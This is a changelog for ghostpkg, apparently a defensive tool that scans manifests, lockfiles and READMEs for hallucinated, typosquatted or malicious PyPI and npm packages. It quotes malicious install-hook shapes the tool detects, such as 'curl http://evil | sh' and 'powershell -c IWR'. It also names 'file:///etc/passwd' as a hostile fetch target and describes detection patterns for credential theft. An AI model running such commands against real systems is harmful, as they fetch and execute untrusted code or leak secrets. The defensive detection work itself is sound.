# Changelog

All notable changes to this project are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/);
this project uses [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.18.1] - 2026-09-02

### Security
- **The GitHub Action no longer interpolates its inputs into the shell script.**
  `${{ inputs.paths }}` was substituted into the *text* of the step before bash
  parsed it, so an input carrying a quote or a semicolon became part of the
  command rather than an argument to it -- GitHub Actions template injection.
  The same applied to `version`, `strict`, `deep` and `fail-on-error`.

  Every input now arrives through `env:` and is read as a shell variable, which
  makes it data rather than script. `paths` is split into an array explicitly,
  so several paths still work; a path containing a space has to be passed on its
  own.

  Anyone pinned to `@v0.18.0` should move to `@v0.18.1`. Exploiting it required
  a workflow that passes attacker-influenced text as an input -- the defaults
  are static -- but that is a thin defence for a tool whose subject is
  supply-chain trust, and it is not the example to set.

  `tests/test_action.py` now fails if any `${{ }}` appears inside a `run:` body,
  if an input stops being passed through `env:`, or if an expansion is left
  unquoted, and it runs the real splitting logic against a payload that tries to
  inject a command. PyYAML is a dev dependency for this; the runtime still has
  none.

## [0.18.0] - 2026-09-02

### Added
- **A GitHub Action.** `uses: M1rwana12/ghostpkg@v0.18.0` is the whole step.
  Inputs: `paths`, `strict`, `deep`, `version`, `python-version`,
  `fail-on-error`.
- **A pre-commit hook.** `repo: https://github.com/M1rwana12/ghostpkg` with
  `id: ghostpkg`. It receives only the staged files that match, so it costs one
  registry lookup per changed dependency rather than a full scan per commit.
- **`--format github`** emits workflow commands, so a pull request is annotated
  on the offending line instead of the answer sitting in a job log. A blocking
  finding is an error and a soft signal is a warning, which keeps the
  annotations and the exit code in agreement about severity. `%`, newlines,
  `:` and `,` are escaped, since an unescaped one silently truncates or splits
  the annotation.
- **Findings carry the file and line the name came from**, in the text output
  (`ghost-pkg  (requirements.txt:12)`) and in `--json` as `source` and `line`.
  Once a scan can search a whole directory, "does not exist" without saying
  which of six files it came from is a finding the reader has to go looking for.
  A name written in two files now produces a finding for each, still on one
  registry lookup.

### Internal
- A `publish.yml` workflow for PyPI Trusted Publishing, so releases are built
  in CI from a tag and signed by an OIDC exchange rather than uploaded from a
  laptop with a token in the shell. It runs only when started by hand until the
  publisher is registered on PyPI.

## [0.17.0] - 2026-09-02

### Added
- **`ghostpkg scan` accepts a directory, and defaults to the current one.**
  `ghostpkg scan .` previously answered "that is a directory, pass a manifest
  file" and exited 2, so using the tool on a project meant knowing and naming
  every dependency file by hand -- dozens of them in a monorepo.

  Two rules keep the result small enough to read:

  - **Vendored and generated trees are skipped**: `node_modules`, `.venv`,
    `.git`, `dist`, `build`, `vendor`, `__pycache__` and the rest.
    `node_modules` alone holds a `package.json` for every installed package, so
    walking into it would turn one scan into thousands of lookups of things
    already on disk.
  - **A lockfile supersedes the manifest beside it.** A lockfile is that
    manifest resolved, so it names everything the manifest does plus the
    transitive dependencies; reading both prints most packages twice and checks
    nothing extra. This applies within one directory only, so a workspace
    member's own `package.json` is still read.

  Agent instruction files (`AGENTS.md`, `CLAUDE.md`, `.cursorrules`) are picked
  up wherever they appear, and the README at the root of the search -- but not
  Markdown in general, which in a large repository is mostly changelogs and
  documentation.

  Measured on a fresh clone of `pallets/flask`: six files found in 2.6 seconds,
  with the root `pyproject.toml` correctly superseded by `uv.lock`.

### Changed
- A file **named on the command line** that cannot be parsed is still an error.
  A file found by searching a directory is skipped instead: refusing to scan a
  whole project because one unrelated file in it is malformed would make the
  directory form unusable. An empty result still exits 3, never 0.

## [0.16.0] - 2026-09-02

### Added
- **`pnpm-lock.yaml` and `yarn.lock` are read.** Measured across twenty popular
  JavaScript repositories, `package-lock.json` -- the only npm lockfile
  ghostpkg could read -- was present in **two** of them; `pnpm-lock.yaml` was in
  ten and `yarn.lock` in six. Four out of five projects had a lockfile the tool
  refused to open.

  Both are read line by line rather than with a YAML library, for the same
  reason `pyproject.toml` has a hand-written fallback: a supply-chain tool that
  installs a dependency tree of its own undermines its own argument.

  - `pnpm-lock.yaml`: lockfile versions 5 (`/react/18.2.0`), 6
    (`/react@18.2.0`) and 9 (`'react@18.2.0'`), including v9 peer resolutions in
    parentheses and v5 peer suffixes after an underscore.
  - `yarn.lock`: classic (v1) and berry (v2+), several descriptors per key, and
    berry aliases -- `@babel-baseline/cli@npm:@babel/cli@7.27.1` is checked as
    `@babel/cli`, the name that actually gets installed.
  - Both apply the stated-source rule from 0.15.0: `workspace:`, `link:`,
    `patch:`, `portal:`, `exec:`, `file:` and git or http descriptors are not
    registry names.

  Validated against the real lockfiles of React, Babel, Jest, Svelte, Vue and
  Vite: **3,292 packages, zero blocks.**

### Fixed
- **A string `repository` field no longer crashes a scan.** npm documents both
  `{"url": ...}` and the shorthand `"github:user/repo"`; ghostpkg assumed the
  object and raised `AttributeError`, which aborted the whole run. It surfaced
  the first time a lockfile was wide enough to contain one -- 435 packages in.
  `parse_npm` is now separate from the request, so registry response shapes are
  testable without a network round trip.

## [0.15.0] - 2026-09-02

### Fixed
- **A dependency that names its own source is no longer looked up on the public
  registry.** The rule was already in the codebase for `name @ url` in a
  requirements file, and had never been applied to the other four parsers. Each
  of these was measured against real files:
  - `pyproject.toml`: **pydantic's own manifest was blocked.** `pydantic-docs`
    is declared in a dependency group and pointed at a git repository by
    `[tool.uv.sources]`; it is not on PyPI, so ghostpkg reported it as
    non-existent. Poetry dependencies given as `{ git = ... }`, `{ path = ... }`
    or `{ url = ... }` had the same problem.
  - `package.json`: a monorepo produced **six false blocks out of nine** --
    `workspace:`, `catalog:`, `file:`, `link:`, `portal:`, `git+`, tarball URLs,
    `github:` and `owner/repo` shorthand, and relative paths.
  - `package.json`: two entries were **silently checked under the wrong name**.
    `link:../linked` was looked up as `linked`, an unrelated real package, and
    reported fine. `npm:lodash@^4` is an alias, so the name to check is
    `lodash`; ghostpkg checked the key instead.
  - `package-lock.json`: workspace members keyed by a plain path were treated as
    registry packages, and `resolved` was ignored -- a git-resolved entry named
    `patched` matched an unrelated package and produced a confident
    "version 1.0.0 does not exist" about it.
  - `poetry.lock` / `uv.lock`: Poetry's `[package.source]` sub-table and uv's
    inline `source = { git = ... }` / `{ editable = ... }` / `{ directory = ... }`
    were ignored.

  This is the failure mode the project treats as worse than a miss, so the fix
  came before anything else. 41 tests were added, 35 of which fail against the
  previous parser.

- **Entries resolved from a private npm registry are left alone.** A corporate
  registry proxies public names *and* hosts private ones under one host, and a
  lockfile does not say which is which. Known public mirrors
  (`registry.yarnpkg.com`, `registry.npmmirror.com`) are still checked, because
  silently checking nothing and reporting success is the failure this project
  already shipped once.

## [0.14.0] - 2026-09-01

### Changed
- **`--json` now returns a versioned envelope** rather than a bare array, with
  a tool name and version, summary counts, and `exists` / `latest_version` on
  each finding. A consumer could not previously tell what produced the output
  or what shape to expect.

### Internal
- Split `cli.py` (361 lines, doing four jobs) into `scanner.py` -- lookups and
  verdicts -- and `report.py` -- presentation -- leaving the CLI to argument
  parsing and exit codes. The two new modules need no terminal, which is what
  a hook or an editor would want to call.

### Considered and rejected: PEP 740 attestations
The idea was to use a verified attestation to *suppress* warnings rather than
add signals, which fits the project's constraints exactly. It did not survive
measurement.

An attestation proves **provenance, not benevolence** -- an attacker can
publish a slopsquat through Trusted Publishing from their own repository just
as easily. So it honestly refutes only one of the warnings, "no repository
link", by supplying that exact missing fact.

Measured across 38 packages from the live PyPI feed: 13 carried an attestation,
8 lacked a repository link, and **2 were in both groups**. A 5% benefit for two
extra HTTP requests per flagged package, since the data is only exposed through
the simple API rather than the endpoint already being fetched. Not built.

## [0.13.0] - 2026-09-01

### Added
- **Prose files are scanned for install commands.** `README`, `AGENTS.md`,
  `CLAUDE.md`, `.cursorrules`, any `.md`/`.mdx`/`.rst`.

  This closes an ordering problem the tool had from the start: **the
  hallucination arrives before the manifest does.** A model writes
  `pip install foo-bar` into a README or an agent instruction file, a person
  copies the line and runs it, and the install has already happened by the time
  that name reaches `requirements.txt`. Scanning only manifests meant arriving
  after the fact.

  Recognises `pip`, `pip3`, `python -m pip`, `uv add`, `uv pip install`,
  `poetry add`, `pipx`, `conda`, `npm`, `pnpm`, `yarn`, `bun`, and the runners
  `npx`, `bunx`, `uvx`. A single file may name both ecosystems, and each
  dependency now carries the one its command implies.

### The measurement that shaped it
A README is full of words that look like package names, so the first version
was checked against ten real ones and produced a **25% false-positive rate**:
`pip install httpx. The command line client is an optional dependency.` gave
back `The`, `command`, `line`, `client` and `is`, because the command ran past
the end of its sentence.

Extraction now stops at the first token that is not a package argument.
Re-measured across thirteen real READMEs — `requests`, `flask`, `httpx`, `ruff`,
`pydantic`, `react`, `vite`, `prettier`, `axios`, `fastapi`, `poetry`, `pytest`,
`webpack`, `lodash` — that is **0%**, while the genuine names are still found.

Anything ambiguous is dropped rather than guessed at: `pip install -r
requirements.txt`, `pip install -e .`, `npm run build`, `pip is a package
manager`, a URL containing the word install, and `npx create-react-app my-app`
(where `my-app` is an argument, not a package) all yield nothing.

## [0.12.0] - 2026-09-01

Two cases the tool used to call **ok**. Both share a shape an existence check
cannot see: the thing *exists*, so the check stops there.

### Added
- **`GP011` -- names the registry confiscated.** When npm removes a package for
  malware it does not delete the name and does not answer 451: it republishes a
  placeholder it owns, pointing at `github.com/npm/security-holder`. `crossenv`
  and `ffmepg`, both real typosquat incidents, look exactly like that -- and
  because the placeholder exists, ghostpkg reported them as **fine**. They are
  blocked now.

  Measured before shipping: 3 of 3 known confiscated names caught, **0 of 200**
  most-downloaded npm packages flagged. Detection matches the repository URL
  rather than the "security holding package" description, because a description
  is free text anyone could copy.

- **`GP010` -- withdrawn versions.** A pinned version the maintainer yanked is
  reported, with the reason they gave: `requests==2.32.0` comes back with
  "Yanked due to conflicts with CVE-2024-35195 mitigation". It warns rather than
  blocks -- the version exists, and pip installs a yanked one when it is pinned
  explicitly, so blocking would be stricter than the package manager itself.

  **PyPI only.** npm's nearest equivalent is `deprecated`, and measurement said
  no: `yanked` covers 0.38% of versions across a dozen popular projects, while
  `deprecated` covers 5.78% and reaches 160 of `glob`'s 168 versions, because
  npm uses it routinely for superseded branches. That is noise, not signal.

## [0.11.0] - 2026-09-01

### Security
- **`--deep` only fetches `https`.** The archive URL comes out of the registry
  response, so it is data we were handed rather than a value we chose. Against
  public PyPI and npm that is fine, but a mirror, a proxy or a private registry
  could answer with `file:///etc/passwd` or an address on the internal network,
  and `--deep` would have fetched and pattern-matched it.

### Added
- Tests for the registry client, run against a local HTTP server so the suite
  still needs no internet. This is where the worst bug in the project lived and
  went untested: a connection that stalled or reset *while the body was being
  read* escaped as a traceback and exited `1` -- the code that means "this
  package does not exist". Covered now, along with status mapping, gzip,
  oversized responses, retry bounds and `Retry-After` capping.

**237 tests.**

## [0.10.0] - 2026-09-01

### Added
- **Stable rule identifiers.** Every finding now carries one -- `GP001` for a
  package that does not exist, `GP002` for a pinned version that does not,
  through to `GP009`. They appear in `--json` and are what an ignore file
  matches on. Nothing else is possible without them: you cannot let someone say
  "not this one" until each finding has a name that will not change.
- **An ignore file**, so one false positive does not mean the check gets
  removed from CI. Three decisions shape it:
  - **It is never read from the project directory.** ghostpkg is meant to sit
    in front of a coding agent, and an agent with shell access can edit files
    in the repository it is working on. A `.ghostpkgignore` next to the code
    would be a suppression list the guarded thing can rewrite. The file comes
    from `--config`, from `GHOSTPKG_CONFIG`, or from the user's own config
    directory.
  - **A reason is required.** An entry nobody can justify in a sentence is one
    nobody will dare remove later.
  - **A malformed file is an error.** Degrading quietly to "no suppressions"
    would be safe; degrading quietly to "no protection" would not, and from
    outside the two are indistinguishable.
- Entries take glob patterns, an optional `ecosystem` and `rule` to narrow
  them, and an optional `expires` date so a suppression does not become
  permanent by accident.

Example, for the case this exists for -- a company with its own index:

```json
{
  "ignore": [
    { "package": "acme-*", "rule": "GP001",
      "reason": "internal, lives on our own index" }
  ]
}
```

### Changed
- Suppressing the reason that caused a block downgrades the verdict rather than
  leaving a block with no explanation behind it. Under `--strict` every reason
  blocks, so removing one is not enough -- which is the correct behaviour, and
  is tested.
- `--json` reasons are now objects with `rule` and `text` instead of bare
  strings.

## [0.9.0] - 2026-09-01

### Added
- **Lockfiles.** `package-lock.json` (both the v1 nested and v2/v3 `packages`
  layouts), `poetry.lock` and `uv.lock`. This matters more than the manifest
  formats already supported: CI installs from the lockfile, so it holds the
  names that actually get fetched, including transitive ones a manifest never
  mentions. Every entry is version-pinned, so all of them are checkable.
- **`scan` takes several files at once**, and they may be different
  ecosystems: `ghostpkg scan requirements.txt package.json package-lock.json`.
  A dependency repeated across files costs one lookup, not one per file.
- **Retry with backoff on rate limiting.** Registries answer 429 and 503 under
  load, and giving up immediately turned a busy moment into a failed run.
  `Retry-After` is honoured when sent, capped at 30 seconds.
- `--workers N` and `--timeout SECONDS`, which were fixed constants.

### Changed
- **New exit code `3`: nothing was scanned.** A manifest that yielded no
  dependencies exited `0`, which reads as "checked, all clean" in CI. `0` now
  means checked and clean, `3` means there was nothing to check.

## [0.8.0] - 2026-09-01

### Added
- **Pinned versions are checked.** `requests==99.99.99` used to come back "ok"
  because only the name was looked up. A version a model invented is the same
  class of mistake as a name it invented, and just as precise to check: the
  registry response already lists every real version, so this costs nothing
  extra. Only exact pins are checked -- `==1.2.3` on PyPI, a bare `1.2.3` on
  npm. Ranges like `>=2.31` or `^4.18.0` may be satisfied by some other
  version, so there is nothing definite to say about them.
- `ghostpkg check requests==2.31.0` accepts a pin on the command line too.

### Fixed
- **`--deep` missed essentially every realistic malicious npm hook.** The
  patterns were written for Python and JavaScript *source*, but npm install
  hooks are *shell commands*. `curl http://evil | sh` carries no `curl -` flag
  to match, `node -e` is not `eval(`, and `powershell -c IWR` looks nothing
  like `urllib.request`. All six shapes now match, and nine ordinary hooks
  (`tsc`, `node-gyp rebuild`, `husky install`, …) stay clean.
- **`"postinstall": "node install.js"` is now followed.** It is the commonest
  shape of all, and the code that matters is in the file it names, which was
  never read.
- **`--deep` no longer passes a package it could not inspect.** A package with
  no source archive, or one larger than the size limit, was silently treated
  like a clean result -- so padding an archive was a way to switch `--deep` off
  from the outside. It now says so and warns.
- **A negative result is never cached.** Caching it for an hour seemed safe
  until a real case appeared: PyPI's RSS announces a package a moment before
  its JSON API serves it, so a lookup 404s, and a legitimately published
  package was then reported as non-existent for the rest of the hour. A stale
  block is the worst failure this tool has. Positive results are still cached.
- **The reported nearest name is deterministic.** Iterating a frozenset has no
  defined order, so `cjson` came back as `ujson` or `ijson` depending on
  `PYTHONHASHSEED`.

### Changed
- The parser now carries each dependency's version specifier and line number
  rather than the bare name.

## [0.7.0] - 2026-09-01

A correctness release. Several of these were **silent** failures -- the tool
reported success having never performed the check, which for a security tool is
worse than crashing. Found by a systematic audit rather than by users.

### Fixed -- silent misses
- **Every package whose name begins with `http` was dropped from
  `requirements.txt`.** A filter meant to skip bare URLs matched names too, so
  `httpx`, `httpcore`, `httplib2` and friends were never checked and the tool
  still printed "all packages look fine". `httpx` is a top-100 PyPI project.
- **`-r` and `-c` includes were ignored**, so a project that splits its
  requirements across files was only half checked. Includes are now followed,
  with cycle detection and a depth limit.

### Fixed -- false blocks
- **Direct references and private indexes.** `internal-lib @ git+https://...`
  was read as the plain name `internal-lib`, which is absent from public PyPI,
  so every internal package in a company using its own index was **blocked**.
  Direct references, `--index-url`, editable installs, local paths and hashes
  are now recognised and skipped.
- **Any `.txt` file was parsed as requirements.** `README.txt` became the
  package list `['Install', 'Run', 'numpy']` -- two confident blocks on prose.
  Only `requirements*.txt`, `constraints*.txt` and `*.in` are accepted now, and
  anything else is refused by name.
- **`--deep` judged packages by install scripts they merely shipped.** Matching
  `setup.py` by basename meant a package vendoring a dependency or including
  packaging test fixtures was blocked on somebody else's code. Only the
  archive's own top-level install script is read.

### Fixed -- wrong exit codes and lost results
- **A connection that failed mid-response escaped as a traceback and exited
  `1`** -- the code meaning "a package does not exist". `urlopen` only wraps
  failures that happen while connecting, so a stalled proxy or a reset
  connection read as a confirmed detection. All lookup failures are now
  `RegistryError`.
- **One failed lookup discarded the entire scan**, including already-confirmed
  blocks, and skipped the cache write so the inevitable retry re-issued every
  request. Failures are now per-name, with a new `ERROR` verdict, and exit
  code `2` -- an unchecked name is never a pass.
- **`ghostpkg scan <directory>`** crashed with a traceback; it now explains
  itself and exits `2`.

### Fixed -- wrong answers
- **npm cache keys collapsed case-distinct packages.** `JSONStream` and
  `jsonstream` are two different real packages; lowercasing both into one key
  served one package's facts for the other, including a wrong `exists`. Keys
  are now normalised per ecosystem -- PEP 503 for PyPI, exact for npm.

### Changed
- **npm lookups now request gzip.** `@types/node` was 10.6 MB per lookup and is
  now 1.35 MB; `react` went from 6.6 MB to 1.30 MB. Responses are also size-capped.
- **Repeated names are looked up once.** Manifests repeat names, and following
  includes makes that more likely.
- `pyproject.toml` now reads PEP 735 `[dependency-groups]`, and Poetry group
  dependencies are found on Python 3.9/3.10 as well as 3.11+.
- `package.json` now reads `peerDependencies`.
- The cache takes a lock around its counters and entry map, and its docstring
  no longer claims threads only read from it -- they do not.

## [0.6.0] - 2026-09-01

### Fixed
- **Typo detection missed parked lookalikes, because age was the wrong gate.**
  The check only ran on packages published within the last year, on the
  reasoning that "an old lookalike is just a package with a similar name". That
  reasoning was wrong. `expresss` has sat on npm since **2016** with one
  release, no repository link, and roughly **2,500 downloads a month** arriving
  purely from other people's typos. Ten years old, and waved straight through.

### Changed
- The typo check now also runs on packages that look **abandoned**: two or fewer
  releases *and* no repository link, at any age.

  The pairing is not a guess. Measured against 120 real packages that sit within
  the typo budget of a popular name:

  | Rule | Wrong about |
  |---|---|
  | Two or fewer releases, alone | 10.0% |
  | No repository link, alone | 5.8% |
  | **Both together** | **0.0%** |

  Either condition alone is too loose because sibling packages in a family sit
  naturally close together — `dagster-k8s` is two edits from `dagster-aws`, and
  `pulumi-tls` from `pulumi-aws`. Those are maintained, so they carry releases
  and a repository, and requiring both conditions leaves them alone.

- Warning text now says which condition fired, rather than calling a
  ten-year-old package "recently published".

### Note
A defensively parked name still passes, which is correct: npm holds `lodahs`
itself and points it at `npm/security-holder`, so it has a repository link.

## [0.5.0] - 2026-09-01

### Added
- **`--deep`: static inspection of install-time code.** This addresses the
  project's main open problem ([#1]) — a hallucinated name an attacker has
  *already registered*. Such a package exists, so the existence check passes,
  and it is young with one release and no repository link, exactly like every
  honest new package. Age cannot separate them; install-time behaviour can,
  because a slopsquat has to run something when it is installed.
- Signals reported: reading environment variables together with a network call,
  a network request, a shell command, decoding a hidden blob, and executing code
  that was just decoded or downloaded.

### How the policy was decided
The previous signal adopted on intuition — scoring packages by age — flagged
100% of legitimate same-day publications. So this one was measured first:

| Group | Flagged |
|---|---|
| 27 established legitimate packages | 0% |
| 32 packages published to PyPI that day | 0% |
| 6 known malicious install-script shapes | 6 of 6 |

That is why a **young** package with install-time signals is **blocked** while
age alone still only warns. An established package with the same signals is
warned about, not blocked.

The first pattern set was far looser and flagged 37% of established packages,
mostly for reading environment variables — ordinary when inspecting build
flags. It also scanned `conftest.py`, which runs during testing and never on
install. Both were mistakes found by measuring rather than by reasoning.

### Safety
Archives are read in memory and never extracted to disk; nothing is executed,
imported or compiled; downloads stop at 8 MB and members at 512 KB so a
decompression bomb cannot exhaust memory; any failure to fetch or parse means
"not inspected" rather than a pass.

[#1]: https://github.com/M1rwana12/ghostpkg/issues/1

## [0.4.0] - 2026-09-01

### Added
- **On-disk cache for registry lookups.** Scanning a 150-package manifest drops
  from 4.7s to 0.4s on a warm cache. Previously every scan cost one request per
  dependency, every run, which is slow in CI and rude to the registry.
- `--no-cache` to bypass it, and `ghostpkg clear-cache` to delete it.
- `GHOSTPKG_CACHE_DIR` to override the location. The default is
  `%LOCALAPPDATA%\ghostpkg` on Windows, `~/Library/Caches/ghostpkg` on macOS and
  `$XDG_CACHE_HOME/ghostpkg` elsewhere, worked out without a dependency.

### Notes on the cache design
- **Time-to-live depends on the answer, and "does not exist" is held for only an
  hour.** A free name can be registered at any moment — that is the whole attack
  — so a negative result must not be trusted for long. Young packages are held
  six hours, established ones a day.
- Cache failures are never fatal. A corrupt file, a wrong schema, a malformed
  entry or an unwritable directory all degrade to no cache rather than breaking
  a run. There are tests for each of those.
- Written atomically via a temporary file and `os.replace`, once per run, so a
  killed process cannot leave a half-written cache behind.

## [0.3.0] - 2026-09-01

### Fixed
- **npm typo detection did not work at all.** Lookalike names were compared
  against the 2,000 most-downloaded *PyPI* projects regardless of ecosystem, so
  `expresss` was never flagged as a typo of `express` -- `express` was not in
  the list being compared against.

### Added
- A list of the 2,000 most-downloaded npm packages, built from the registry's
  own download-count API. `nearest_popular()` now picks the list matching the
  ecosystem.
- Scoped npm names are compared on the part after the slash, since that is what
  a squat targets: `@evil/expresss` is flagged, `@types/node` and `@babel/core`
  are not.

### Changed
- Typo distance is now Damerau-Levenshtein: swapping two adjacent characters
  counts as one edit rather than two. Transposition is the commonest typosquat
  shape, and under plain Levenshtein `recat`, `lodahs` and `webpakc` all scored
  two edits, which put them outside the budget for names that short. All three
  are caught now, and the false-positive rate across both 2,000-name lists is
  still zero -- there are tests asserting exactly that.
- Names shorter than five characters are no longer compared at all. Below that
  the name space is too dense for edit distance to mean anything: `core` sits
  one edit from `cors`.

## [0.2.0] - 2026-09-01

### Fixed
- **`scan` reported nonsense for `pyproject.toml`.** Every file that was not
  `package.json` was handed to the requirements.txt parser, so TOML keys were
  read as package names: `build-backend` came back "does not exist on pypi",
  and `version` came back "ok" because a package of that name exists. For a
  security tool, confidently reporting nonsense is the worst failure mode.

### Added
- `pyproject.toml` support in `scan`: PEP 621 `project.dependencies` and
  `project.optional-dependencies`, plus Poetry's `tool.poetry` groups.
  `[build-system] requires` is excluded, and Poetry's `python` constraint is
  not treated as a package.
- Manifests are now detected explicitly. An unrecognised file is **refused with
  an error rather than guessed at** — guessing was the root cause of the bug
  above.
- A narrow TOML fallback parser for Python 3.9 and 3.10, which have no
  `tomllib`. Adding a TOML dependency would contradict the zero-dependency rule,
  and the fallback is tested by forcing the import to fail rather than by
  trusting the interpreter the suite runs on.

### Changed
- `--version` now reads `__version__` instead of a hardcoded string.

## [0.1.0] - 2026-09-01

First release.

### Added
- `ghostpkg check` — check one or more package names against PyPI or npm.
- `ghostpkg scan` — check every dependency in `requirements.txt` or `package.json`.
- Verdicts: `BLOCK` for names absent from the registry, `WARN` for weak signals
  (recent publication, single release, missing repository link, small edit
  distance to a popular name), `OK` otherwise.
- `--strict` to promote warnings to blocks, `--json` for machine-readable output,
  `-q/--quiet` to hide passing packages.
- Exit codes: `0` nothing blocked, `1` something blocked, `2` usage or registry
  error.
- Bundled list of the 2,000 most-downloaded PyPI projects, used only for typo
  distance.

### Notes on the design
- The default profile blocks on **non-existence only**. An earlier version scored
  packages and blocked anything suspicious; measured against the live feed of
  newly published PyPI packages, it flagged 100% of legitimate same-day
  publications. Age cannot separate a malicious registration from an honest new
  release, so softer signals are warnings.
- The typo-distance budget scales with name length. A flat budget flagged `flask`,
  `click` and `black` as typos of one another.
- Zero runtime dependencies, by policy.
- No corpus of hallucinated package names is shipped, following the decision of
  the USENIX'25 authors not to publish theirs.

[Unreleased]: https://github.com/M1rwana12/ghostpkg/compare/v0.18.1...HEAD
[0.18.1]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.18.1
[0.18.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.18.0
[0.17.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.17.0
[0.16.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.16.0
[0.15.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.15.0
[0.14.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.14.0
[0.13.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.13.0
[0.12.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.12.0
[0.11.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.11.0
[0.10.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.10.0
[0.9.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.9.0
[0.8.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.8.0
[0.7.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.7.0
[0.6.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.6.0
[0.5.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.5.0
[0.4.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.4.0
[0.3.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.3.0
[0.2.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.2.0
[0.1.0]: https://github.com/M1rwana12/ghostpkg/releases/tag/v0.1.0
